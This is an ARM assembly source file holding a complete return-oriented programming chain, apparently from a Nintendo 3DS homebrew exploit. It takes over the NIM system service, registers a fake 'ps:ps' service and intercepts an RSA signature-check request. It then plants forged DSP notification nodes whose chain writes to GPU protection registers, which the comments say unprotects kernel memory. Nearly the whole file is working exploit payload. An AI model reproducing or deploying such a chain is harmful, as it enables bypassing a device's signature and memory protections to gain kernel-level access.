	.arm
	.section .rodata.NIM_ROP_Service, "a"
	.p2align 4
	#include "nim_rop.h"
	#define ROP_ABSTRACT_ADDR(x) (ROP_SERVICE_TAKEOVER_ADDR + ((x) - NIMS_0x5E_ROP_TakeOver))
	.altmacro

	@ if *DPtr1 == *DPtr2 continue else jump to FailPivot
	.macro WordPtrsCMP_PIVOT_FAIL DPtr1:req, DPtr2:req, FailPivot:req
	.word ROP_POPR0PC @ pc
	.word ROP_STACK_PIVOTBUF_ADDR(ROP_ABSTRACT_ADDR(1f)) @ r0
	.word ROP_STACK_PIVOT @ pivot
	@ pivot data
	1:
	.word \DPtr1 @ r1
	.word 0 @ r2
	.word 0 @ r3
	.word 0 @ r12
	.word ROP_ABSTRACT_ADDR(1f) @ sp - right after pivot
	.word ROP_POPR1R2R3PC @ lr
	.word ROP_POPR0PC @ pc
	@ pivot data end
	1:
	.word \DPtr2 @ r0
	.word ROP_WORDPTRDERFS_CMP_BXLR @ pc
	.word 0 @ r1
	.word 4 @ r2
	.word 0 @ r3
	.word ROP_LMUL_POPPC @ pc
	.word ROP_POPR4R5R6PC @ pc
	1:
	.word ROP_STACK_PIVOTBUF_ADDR(\FailPivot\()) @ r4 / fail
	.word ROP_STACK_PIVOTBUF_ADDR(ROP_ABSTRACT_ADDR(1f)) @ r5 / pass
	.word ROP_ABSTRACT_ADDR(1b) @ r6
	.word ROP_POPR1PC @ pc
	.word ROP_STACK_PIVOT @ r1
	.word ROP_LDR_R0FROMR0R6_BLXR1 @ pc
	@ pivot data
	1:
	.word 0 @ r1
	.word 0 @ r2
	.word 0 @ r3
	.word 0 @ r12
	.word ROP_ABSTRACT_ADDR(1f) @ sp - right after pivot
	.word 0 @ lr
	.word ROP_POPPC @ pc
	@ pivot data end
	1:
	.endm

	.macro svcReplyAndReceive_Handles ReplyHandlePtr:req, HandlesPtr:req
	.word ROP_POPR0PC @ pc
	.word \ReplyHandlePtr @ r0
	.word ROP_LDR_R0FROMR0_POPR4PC @ pc
	.word ROP_GARBAGE @ r4
	.word ROP_POPR1PC @ pc
	.word ROP_ABSTRACT_ADDR(2f) @ r1 - pivot data r3
	.word ROP_STR_R0TOR1_POPR4PC @ pc
	.word ROP_GARBAGE @ r4
	.word ROP_POPR0PC @ pc
	.word ROP_STACK_PIVOTBUF_ADDR(ROP_ABSTRACT_ADDR(1f)) @ r0
	.word ROP_STACK_PIVOT @ pivot
	@ pivot data for svcReplyAndReceive calling
	1:
	.word \HandlesPtr @ r1
	.word 1 @ r2
	2:
	.word 0xBEEFBEEF @ r3
	.word 0 @ r12
	.word ROP_ABSTRACT_ADDR(1f) @ sp - right after pivot
	.word ROP_POPR1PC @ lr
	.word ROP_POPR0PC @ pc
	1:
	@ pivot data end
	.word ROP_ABSTRACT_ADDR(.LSVC0x4F_indextmp) @ r0
	.word ROP_SVCREPLYANDRECEIVE_SKIPPUSH @ pc
	.word ROP_ABSTRACT_ADDR(.LSVC0x4F_indextmp) @ popped by svcReplyAndReceive, stores &index
	.word ROP_ABSTRACT_ADDR(.LSVC0x4F_resulttmp) @ r1
	.word ROP_STR_R0TOR1_POPR4PC @ pc
	.word ROP_GARBAGE @ r4
	WordPtrsCMP_PIVOT_FAIL ROP_ABSTRACT_ADDR(.LSVC0x4F_resulttmp), ROP_ABSTRACT_ADDR(.LComparable_zero), ROP_ABSTRACT_ADDR(.LPivot_Critical_Failed)
	WordPtrsCMP_PIVOT_FAIL ROP_ABSTRACT_ADDR(.LSVC0x4F_indextmp), ROP_ABSTRACT_ADDR(.LComparable_zero), ROP_ABSTRACT_ADDR(.LPivot_Critical_Failed)
	.endm

	.macro Copy_From_TlsCMDBuf dest:req, len:req
	.word ROP_POPR0PC @ pc
	.word ROP_ABSTRACT_ADDR(.LTLS_CMD_Addr) @ r0
	.word ROP_LDR_R0FROMR0_POPR4PC @ pc
	.word ROP_GARBAGE @ r4
	.word ROP_POPR1R2R3PC @ pc
	.word ROP_ABSTRACT_ADDR(1f) @ r1 - r1 arg fix up
	.word \len @ r2
	.word ROP_GARBAGE @ r3
	.word ROP_STR_R0TOR1_POPR4PC @ pc
	.word ROP_GARBAGE @ r4
	.word ROP_POPR1PC @ pc
	1:
	.word 0xBEEFBEEF @ r1
	.word ROP_POPR0PC @ pc
	.word \dest @ r0
	.word ROP_MEMCPY_POPR0PC @ bl memcpy, pop {r0, pc}
	.word ROP_GARBAGE @ r0
	.endm

	.macro Copy_To_TlsCMDBuf src:req, len:req
	.word ROP_POPR0PC @ pc
	.word ROP_ABSTRACT_ADDR(.LTLS_CMD_Addr) @ r0
	.word ROP_LDR_R0FROMR0_POPR4PC @ pc
	.word ROP_GARBAGE @ r4
	.word ROP_POPR1R2R3PC @ pc
	.word \src @ r1
	.word \len @ r2
	.word ROP_GARBAGE @ r3
	.word ROP_MEMCPY_POPR0PC @ bl memcpy, pop {r0, pc}
	.word ROP_GARBAGE @ r0
	.endm

	.global NIMS_0x5E_ROP_TakeOver
NIMS_0x5E_ROP_TakeOver:
	.fill 0x208
	@ at this point, its our rop service
	@ this is a linear service, expecting specific order of commands
	@ first lets get tls cmd address and safe it to be easier
	.word ROP_GETTLSADDR_ADD0X5C_POPR4PC @ thumb get tls pointer+0x5C to r0, pop {r4, pc}
	.word ROP_GARBAGE @ r4
	.word ROP_ADDR0_0X10_POPR4PC @ thumb add r0, #0x10 and pop {r4,pc}
	.word ROP_GARBAGE @ r4
	.word ROP_ADDR0_0X10_POPR4PC @ thumb add r0, #0x10 and pop {r4,pc}
	.word ROP_GARBAGE @ r4
	.word ROP_ADDR0_0X4_POPR4PC @ thumb add r0, #4 and pop {r4,pc}
	.word ROP_GARBAGE @ r4
	.word ROP_POPR1PC @ pc
	.word ROP_ABSTRACT_ADDR(.LTLS_CMD_Addr) @ r1
	.word ROP_STR_R0TOR1_POPR4PC @ pc
	@ set a new static buf 0 size
	.word IPC_Desc_StaticBuffer(0x208, 0) @ r4
	.word ROP_POPR1R2R3PC @ POP {R1-R3, PC}
	.word ROP_GARBAGE @ r1
	.word 0x100 @ r2  0x180 - 0x80
	.word ROP_GARBAGE @ r3
	.word ROP_STR_R4TOR2R0_POPR4PC @ str r4, [r2,r0] and pop {r4,pc}
	@ now we reply back so we can proceed in the user app side
	.word ROP_GARBAGE @ r4
	.word ROP_POPR1R2R3PC @ POP {R1-R3, PC}
	.word ROP_ABSTRACT_ADDR(.LNIM_0x5E_Response) @ r1
	.word .LNIM_0x5E_Response_end - .LNIM_0x5E_Response @ r2
	.word ROP_GARBAGE @ r3
	.word ROP_MEMCPY_POPR0PC @ bl memcpy, pop {r0, pc}
	.word ROP_GARBAGE @ r0
	svcReplyAndReceive_Handles ROP_NIMS_SESSION_HANDLE_ADDR, ROP_NIMS_SESSION_HANDLE_ADDR
	@ excepting custom cmd 0x1001
	Copy_From_TlsCMDBuf ROP_ABSTRACT_ADDR(.LCMDBUF_WorkSpace), 0x100
	WordPtrsCMP_PIVOT_FAIL ROP_ABSTRACT_ADDR(.LCMDBUF_WorkSpace), ROP_ABSTRACT_ADDR(.LCustom0x1001), ROP_ABSTRACT_ADDR(.LPivot_Critical_Failed)
	.word ROP_POPR0PC @ pc
	.word ROP_ABSTRACT_ADDR(.LSVC0x4F_handles+0) @ r0
	.word ROP_POPR1R2R3PC @ pc
	.word ROP_ABSTRACT_ADDR(.LPSPS_Name) @ r1
	.word 5 @ r2
	.word 1 @ r3
	.word ROP_SRVREGISTERSERVICE_NOPUSH @ pc
	@ normally this function pushes {r1-r7} so we set that as well
	.word ROP_ABSTRACT_ADDR(.LPSPS_Name) @ r1
	.word 5 @ r2
	.word 1 @ r3
	.word ROP_GARBAGE @ r4
	.word ROP_GARBAGE @ r5
	.word ROP_GARBAGE @ r6
	.word ROP_GARBAGE @ r7
	.word ROP_POPR1PC @ pc
	.word ROP_ABSTRACT_ADDR(.LTmpCmpVar) @ r1
	.word ROP_STR_R0TOR1_POPR4PC @ pc
	.word ROP_GARBAGE @ r4
	WordPtrsCMP_PIVOT_FAIL ROP_ABSTRACT_ADDR(.LTmpCmpVar), ROP_ABSTRACT_ADDR(.LComparable_zero), ROP_ABSTRACT_ADDR(.LPivot_Critical_Failed)
	@ got event to create
	.word ROP_POPR0PC @ pc
	.word ROP_STACK_PIVOTBUF_ADDR(ROP_ABSTRACT_ADDR(1f)) @ r0 - pivot addr
	.word ROP_STACK_PIVOT @ pc
	1:
	.word 1 @ r1 - RESET_STICKY
	.word 0 @ r2
	.word 0 @ r3
	.word 0 @ r12
	.word ROP_ABSTRACT_ADDR(1f) @ sp - right after pivot
	.word ROP_POPR1PC @ lr
	.word ROP_SVCCREATEEVENT_SKIPPUSH @ pc
	1:
	.word ROP_ABSTRACT_ADDR(.LSVC0x4F_handles+8) @ [SP] target new event
	.word ROP_ABSTRACT_ADDR(.LTmpCmpVar) @ r1
	.word ROP_STR_R0TOR1_POPR4PC @ pc
	.word ROP_GARBAGE @ r4
	WordPtrsCMP_PIVOT_FAIL ROP_ABSTRACT_ADDR(.LTmpCmpVar), ROP_ABSTRACT_ADDR(.LComparable_zero), ROP_ABSTRACT_ADDR(.LPivot_Critical_Failed)
	@ signal event
	.word ROP_POPR0PC @ pc
	.word ROP_STACK_PIVOTBUF_ADDR(ROP_ABSTRACT_ADDR(1f)) @ r0 - pivot addr
	.word ROP_STACK_PIVOT @ pc
	1:
	.word ROP_GARBAGE @ r1
	.word ROP_GARBAGE @ r2
	.word ROP_GARBAGE @ r3
	.word ROP_GARBAGE @ r12
	.word ROP_ABSTRACT_ADDR(1f) @ sp - right after pivot
	.word ROP_POPR1PC @ lr
	.word ROP_POPR0PC @ pc
	1:
	.word ROP_ABSTRACT_ADDR(.LSVC0x4F_handles+8) @ r0
	.word ROP_LDR_R0FROMR0_POPR4PC @ pc
	.word ROP_GARBAGE @ r4
	.word ROP_SVCSIGNALEVENT @ pc - lr used here
	.word ROP_ABSTRACT_ADDR(.LTmpCmpVar) @ r1
	.word ROP_STR_R0TOR1_POPR4PC @ pc
	.word ROP_GARBAGE @ r4
	WordPtrsCMP_PIVOT_FAIL ROP_ABSTRACT_ADDR(.LTmpCmpVar), ROP_ABSTRACT_ADDR(.LComparable_zero), ROP_ABSTRACT_ADDR(.LPivot_Critical_Failed)
	Copy_To_TlsCMDBuf ROP_ABSTRACT_ADDR(.LCustom0x1001_Response), (.LCustom0x1001_Response_end - .LCustom0x1001_Response)
	svcReplyAndReceive_Handles ROP_NIMS_SESSION_HANDLE_ADDR, ROP_ABSTRACT_ADDR(.LSVC0x4F_handles+0)
	@ got request to accept
	.word ROP_POPR0PC @ pc
	.word ROP_ABSTRACT_ADDR(.LSVC0x4F_handles+0) @ r0
	.word ROP_LDR_R0FROMR0_POPR4PC @ pc
	.word ROP_GARBAGE @ r4
	.word ROP_POPR1PC @ pc
	.word ROP_ABSTRACT_ADDR(1f) @ r1
	.word ROP_STR_R0TOR1_POPR4PC @ pc
	.word ROP_GARBAGE @ r4
	.word ROP_POPR0PC @ pc
	.word ROP_STACK_PIVOTBUF_ADDR(ROP_ABSTRACT_ADDR(1f)) @ r0 - pivot addr
	.word ROP_STACK_PIVOT @ pc
	1:
	.word ROP_GARBAGE @ r1 - handle
	.word 0 @ r2
	.word 0 @ r3
	.word 0 @ r12
	.word ROP_ABSTRACT_ADDR(1f) @ sp - right after pivot
	.word ROP_POPR1PC @ lr
	.word ROP_SVCACCEPTSESSION_SKIPPUSH @ pc
	1:
	.word ROP_ABSTRACT_ADDR(.LSVC0x4F_handles+4) @ [SP] target new session
	.word ROP_ABSTRACT_ADDR(.LTmpCmpVar) @ r1
	.word ROP_STR_R0TOR1_POPR4PC @ pc
	.word ROP_GARBAGE @ r4
	WordPtrsCMP_PIVOT_FAIL ROP_ABSTRACT_ADDR(.LTmpCmpVar), ROP_ABSTRACT_ADDR(.LComparable_zero), ROP_ABSTRACT_ADDR(.LPivot_Critical_Failed)
	svcReplyAndReceive_Handles .LZero, ROP_ABSTRACT_ADDR(.LSVC0x4F_handles+4)
	@ expecting cmd 0x2
	Copy_From_TlsCMDBuf ROP_ABSTRACT_ADDR(.LCMDBUF_WorkSpace), 0x100
	WordPtrsCMP_PIVOT_FAIL ROP_ABSTRACT_ADDR(.LCMDBUF_WorkSpace), ROP_ABSTRACT_ADDR(.LPS_VerifyRsaSha256Header), ROP_ABSTRACT_ADDR(.LPivot_Critical_Failed)
	.word ROP_POPR0PC @ pc
	.word ROP_ABSTRACT_ADDR(.LCMDBUF_WorkSpace + 4*13) @ r0
	.word ROP_LDR_R0FROMR0_POPR4PC @ pc
	.word ROP_GARBAGE @ r4
	.word ROP_POPR1R2R3PC @ pc
	.word 0 @ r1
	.word 12 @ r2
	.word ROP_GARBAGE @ r3
	.word ROP_GET_R0_BIT_CHUNK_POPR4PC @ pc
	.word ROP_GARBAGE @ r4
	.word ROP_POPR1PC @ pc
	.word ROP_ABSTRACT_ADDR(.LTmpCmpVar) @ r1
	.word ROP_STR_R0TOR1_POPR4PC @ pc
	.word ROP_GARBAGE @ r4
	WordPtrsCMP_PIVOT_FAIL ROP_ABSTRACT_ADDR(.LTmpCmpVar), ROP_ABSTRACT_ADDR(.LComparable_zero), ROP_ABSTRACT_ADDR(.LPivot_Critical_Failed)
	.word ROP_POPR1R2R3PC @ pc
	.word ROP_ABSTRACT_ADDR(1f) @ r1 - to update memcpy's r0 rop
	.word ROP_GARBAGE @ r2
	.word ROP_ABSTRACT_ADDR(.-4) @ r3
	.word ROP_POPR0PC @ pc
	.word ROP_ABSTRACT_ADDR(.LCMDBUF_WorkSpace + 4*13) @ r0
	.word ROP_LDR_R0FROMR0_POPR4PC @ pc
	.word ROP_GARBAGE @ r4
	.word ROP_STR_R0TOR1_POPR4PC @ pc
	.word 0xEA0 - 0xAB8 @ r4
	.word ROP_ADDR0_R4_STR_R0TOR3_POPR4PC @ pc
	.word ROP_GARBAGE @ r4
	.word ROP_POPR1R2R3PC @ pc
	.word ROP_ABSTRACT_ADDR(.Ldsp_notif_manager_start) @ r1
	.word .Ldsp_notif_manager_end - .Ldsp_notif_manager_start @ r2
	.word ROP_GARBAGE @ r3
	.word ROP_MEMCPY_POPR0PC @ bl memcpy, pop {r0, pc}
	1:
	.word 0xBEEFBEEF @ r0
	.word ROP_POPR1R2R3PC @ pc
	.word ROP_ABSTRACT_ADDR(.Ldsp_rop_notif_start) @ r1
	.word .Ldsp_rop_notif_end - .Ldsp_rop_notif_start @ r2
	.word ROP_GARBAGE @ r3
	.word ROP_MEMCPY_POPR0PC @ bl memcpy, pop {r0, pc}
	.word ROP_ABSTRACT_ADDR(.LCMDBUF_WorkSpace + 4*13) @ r0
	.word ROP_LDR_R0FROMR0_POPR4PC @ pc
	.word ROP_GARBAGE @ r4
	.word ROP_POPR1PC @ pc
	.word ROP_ABSTRACT_ADDR(.LPS_VerifyRsaSha256Header_Response + 4*3) @ r1
	.word ROP_STR_R0TOR1_POPR4PC @ pc
	.word ROP_GARBAGE @ r4
	Copy_To_TlsCMDBuf ROP_ABSTRACT_ADDR(.LPS_VerifyRsaSha256Header_Response), (.LPS_VerifyRsaSha256Header_Response_end - .LPS_VerifyRsaSha256Header_Response)
	svcReplyAndReceive_Handles ROP_ABSTRACT_ADDR(.LSVC0x4F_handles+4), ROP_ABSTRACT_ADDR(.LSVC0x4F_handles+8)
	@ cleaning!
	.word ROP_POPR0PC @ pc
	.word ROP_ABSTRACT_ADDR(.LPSPS_Name) @ r0
	.word ROP_POPR1PC @ pc
	.word 5 @ r1
	.word ROP_SRVUNREGISTERSERVICE_NOPUSH @ pc
	.word ROP_GARBAGE @ r2
	.word ROP_GARBAGE @ r3
	.word ROP_GARBAGE @ r4
	.word ROP_GARBAGE @ r5
	.word ROP_GARBAGE @ r6
	.word ROP_POPR1R2R3PC @ pc
	.word ROP_GARBAGE @ r1
	.word ROP_GARBAGE @ r2
	.word ROP_ABSTRACT_ADDR(.LTmpCmpVar) @ r3
	.word ROP_STR_R0TOR3_POPR4PC @ pc
	.word ROP_GARBAGE @ r4
	WordPtrsCMP_PIVOT_FAIL ROP_ABSTRACT_ADDR(.LTmpCmpVar), ROP_ABSTRACT_ADDR(.LComparable_zero), ROP_ABSTRACT_ADDR(.LPivot_Critical_Failed)
	.word ROP_POPR0PC @ pc
	.word ROP_ABSTRACT_ADDR(.LSVC0x4F_handles+0) @ r0
	.word ROP_OBJHANDLE_CLOSE_POPR4PC @ pc
	.word ROP_GARBAGE @ r4
	.word ROP_POPR0PC @ pc
	.word ROP_ABSTRACT_ADDR(.LSVC0x4F_handles+4) @ r0
	.word ROP_OBJHANDLE_CLOSE_POPR4PC @ pc
	.word ROP_GARBAGE @ r4
	.word ROP_POPR0PC @ pc
	.word ROP_ABSTRACT_ADDR(.LSVC0x4F_handles+8) @ r0
	.word ROP_OBJHANDLE_CLOSE_POPR4PC @ pc
	.word ROP_GARBAGE @ r4
	@ restore original static buf
	.word ROP_POPR0PC @ pc
	.word ROP_ABSTRACT_ADDR(.LTLS_CMD_Addr) @ r0
	.word ROP_LDR_R0FROMR0_POPR4PC @ pc
	.word ROP_STATICBUF_DESCINDEX0 @ r4
	.word ROP_POPR1R2R3PC @ POP {R1-R3, PC}
	.word ROP_GARBAGE @ r1
	.word 0x104 @ r2  0x184 - 0x80
	.word ROP_GARBAGE @ r3
	.word ROP_STR_R4TOR2R0_POPR4PC @ str r4, [r2,r0] and pop {r4,pc}
	.word IPC_Desc_StaticBuffer(0x40, 0) @ r4
	.word ROP_POPR1R2R3PC @ POP {R1-R3, PC}
	.word ROP_GARBAGE @ r1
	.word 0x100 @ r2  0x180 - 0x80
	.word ROP_GARBAGE @ r3
	.word ROP_STR_R4TOR2R0_POPR4PC @ str r4, [r2,r0] and pop {r4,pc}
	.word ROP_GARBAGE @ r4
	@ now we load the recovery payload
	.word ROP_POPR0PC @ pc
	.word ROP_STATICBUF_DESCINDEX2 @ r0
	.word ROP_POPR1R2R3PC @ pc
	.word ROP_ABSTRACT_ADDR(.LROP_Service_Restore) @ r1
	.word .LROP_Service_Restore_end - .LROP_Service_Restore @ r2
	.word ROP_GARBAGE @ r3
	.word ROP_MEMCPY_POPR0PC @ pc
	.word ROP_STACK_PIVOTBUF_ADDR(ROP_ABSTRACT_ADDR(1f)) @ r0 - stack pivot data
	.word ROP_STACK_PIVOT @ going back to flow
	1:
	@ pivot data
	.word 0 @ r1
	.word 0 @ r2
	.word 0 @ r3
	.word 0 @ r12
	.word ROP_STATICBUF_DESCINDEX2 @ sp
	.word 0 @ lr
	.word ROP_POPPC @ pc

	@temp work space and prebuilt values
.LTLS_CMD_Addr:
	.word 0

.LSVC0x4F_indextmp:
	.word 0
.LSVC0x4F_resulttmp:
	.word 0

.LSVC0x4F_handles:
	.word 0 @ fake ps:ps service server
	.word 0 @ ps:ps session
	.word 0 @ bailout event

.LPSPS_Name:
	.byte 'p', 's', ':', 'p', 's', 0, 0, 0

.LTmpCmpVar:
	.word 0

.LdspFwBssAddrPageOffset:
	.word 0xAB8 @ 0x10CAB8 & 0xFFF

.LComparable_zero:
.LZero:
	.word 0

#define REL_FIXED_ADDR_ROPNOTIF(x) (0x10CAB8 + ((x) - .Ldsp_rop_notif_start))

.Ldsp_notif_manager_start:
	.word REL_FIXED_ADDR_ROPNOTIF(1f) @ firstNode
	.word 1 @ lock.lock
	.word 0 @ lock.thread_tag
	.word 0 @ lock.counter
.Ldsp_notif_manager_end:

.Ldsp_rop_notif_start:
	@ notifications
	@ [0]
	.word 0 @ vtable
	1:
	.word (REL_FIXED_ADDR_ROPNOTIF(1f) - 0x0FFFFF70) + 4 @ node.prev
	.word REL_FIXED_ADDR_ROPNOTIF(3f) @ node.next
	2:
	.word 0x101B38 @ notificationId
	@ [1]
	.word REL_FIXED_ADDR_ROPNOTIF(2b) @ vtable
	3:
	.word REL_FIXED_ADDR_ROPNOTIF(1b) @ node.prev
	.word 0 @ node.next
	.word 0x100 @ notificationId

	@ rop
	1:
	.word 0x001015D0 @ pc (reload regs)

	.word 0x1EC40140 @ r4, CFG11_GPUPROT (user virtual address)
	.word 0x00000000 @ r5, 0, unprotect everything including AXIWRAM (where kernel is located)
	.word 0x12345678 @ r6, don't care
	.word 0x001015CC @ pc (write & reload regs)

	@ Just to make sure Arm11 arbitrates the bus where we want to write our code
	.word 0x1EC40000 @ r4, CFG11_SHAREDWRAM_32K_DATA<0..4>
	.word 0x8D898581 @ r5, enable 32K chunk & set the Arm11 as bus master
	.word 0x12345678 @ r6, don't care
	.word 0x001015CC @ pc (write & reload regs)

	.word 0x1EC40008 @ r4, CFG11_SHAREDWRAM_32K_CODE<0..4>
	.word 0x8D898581 @ r5, enable 32K chunk & set the Arm11 as bus master
	.word 0x12345678 @ r6, don't care
	.word 0x001015CC @ pc (write & reload regs)

	.word 0x12345678 @ r4, don't care
	.word 0x12345678 @ r5, don't care
	.word 0x12345678 @ r6, don't care
	.word 0x00101094 @ pc, reset & disable dsp

	.word 0x12345678 @ r4, don't care
	.word 0x001048C4 @ pc, svcExitProcess	
.Ldsp_rop_notif_end:

.LCustom0x1001:
	.word IPC_MakeHeader(0x1001, 0, 0)
.LPS_VerifyRsaSha256Header:
	.word IPC_MakeHeader(0x2, 9, 4)

.LCustom0x1001_Response:
	.word IPC_MakeHeader(0x1001, 1, 0)
	.word 0
.LCustom0x1001_Response_end:

.LPS_VerifyRsaSha256Header_Response:
	.word IPC_MakeHeader(0x2, 1, 2)
	.word 0xD15EA5E5 @ bail!
	.word IPC_Desc_Buffer(0x1000 - 0xAB8, IPC_BUFFER_W)
	.word 0xBEEFBEEF
.LPS_VerifyRsaSha256Header_Response_end:

.LNIM_0x5E_Response:
	.word IPC_MakeHeader(0x5e, 2, 0)
	.word 0
	.word 0
.LNIM_0x5E_Response_end:

.LCMDBUF_WorkSpace:
	.fill 0x40, 4, 0

.LPivot_Critical_Failed:
	.word 0 @ r1
	.word 0 @ r2
	.word 0 @ r3
	.word 0 @ r12
	.word ROP_ABSTRACT_ADDR(1f) @ sp - right after pivot
	.word ROP_POPR0PC @ lr
	.word ROP_POPR0PC @ pc
	1:
	.word 0 @ r0 - USERBREAK_PANIC
	.word ROP_SVCBREAK @ pc
	@ shouldn't return, but just in case
	.word ROP_STACK_PIVOTBUF_ADDR(ROP_ABSTRACT_ADDR(.LPivot_Critical_Failed)) @ r0
	.word ROP_STACK_PIVOT @ pc

	#define ROP_RECOVERY_ABSTRACT_ADDR(x) (ROP_STATICBUF_DESCINDEX2 + ((x) - .LROP_Service_Restore))
.LROP_Service_Restore:
	.word ROP_POPR0PC @ pc
	.word ROP_STACK_PIVOTBUF_ADDR(ROP_RECOVERY_ABSTRACT_ADDR(1f)) @ r0
	.word ROP_STACK_PIVOT @ pc
	1:
	.word ROP_SERVICE_TAKEOVER_ADDR @ r1
	.word 0 @ r2
	.word ROP_SERVICE_TAKEOVER_SIZE @ r3
	.word 0 @ r12
	.word ROP_RECOVERY_ABSTRACT_ADDR(1f) @ sp - right after pivot
	.word ROP_POPR4R5PC @ lr - hop over stack args
	.word ROP_SVCCONTROLMEMORY_SKIPPUSH @ pc
	1:
	.word ROP_RECOVERY_ABSTRACT_ADDR(1b) @ r0 - garbage pointer
	.word ROP_GARBAGE @ r4
	.word 1 @ stack arg 1
	.word 0 @ stack arg 2
	.word ROP_POPR0PC @ pc
	.word ROP_STACK_PIVOTBUF_ADDR(ROP_RECOVERY_ABSTRACT_ADDR(1f)) @ r0 - stack pivot data
	.word ROP_STACK_PIVOT @ going back to flow
	@ pivot data
	1:
	.word 0 @ r1
	.word 0 @ r2
	.word 0 @ r3
	.word 0 @ r12
	.word ROP_STACK_RECOVER_ADDR @ sp
	.word 0 @ lr
	.word ROP_POPR4R5R6R7PC @ pc
.LROP_Service_Restore_end:
.LNIMS_0x5E_ROP_TakeOver_end:
	.size NIMS_0x5E_ROP_TakeOver, .-NIMS_0x5E_ROP_TakeOver

	.section .rodata.NIM_ROP_Service_size, "a"

	.global NIMS_0x5E_ROP_TakeOver_size
NIMS_0x5E_ROP_TakeOver_size:
	.word .LNIMS_0x5E_ROP_TakeOver_end - NIMS_0x5E_ROP_TakeOver
	.size NIMS_0x5E_ROP_TakeOver_size, .-NIMS_0x5E_ROP_TakeOver_size
